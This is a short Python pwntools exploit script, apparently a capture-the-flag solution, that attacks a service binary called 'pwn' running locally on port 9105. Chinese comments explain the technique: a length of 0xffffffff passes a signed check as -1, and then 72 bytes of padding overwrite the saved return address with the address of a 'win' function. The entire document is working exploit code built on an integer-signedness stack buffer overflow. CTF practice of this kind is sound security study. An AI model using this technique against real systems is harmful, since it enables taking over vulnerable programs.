#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9105'))

context(arch='amd64', os='linux', log_level='info')

elf = ELF(os.path.join(HERE, '..', 'files', 'pwn'))
win = elf.symbols['win']

p = remote(HOST, PORT)
p.recvuntil(b'endian):')
# (int)0xffffffff == -1，通过 len > 64 的有符号比较，随后 read 收到 0xffffffff
p.send(p32(0xffffffff))
time.sleep(0.2)
# buf[64] 在 rbp-0x40，返回地址在 rbp+8：64 + 8 = 72
p.send(b'A' * 72 + p64(win))
print(p.recvall(timeout=3).decode(errors='replace'))
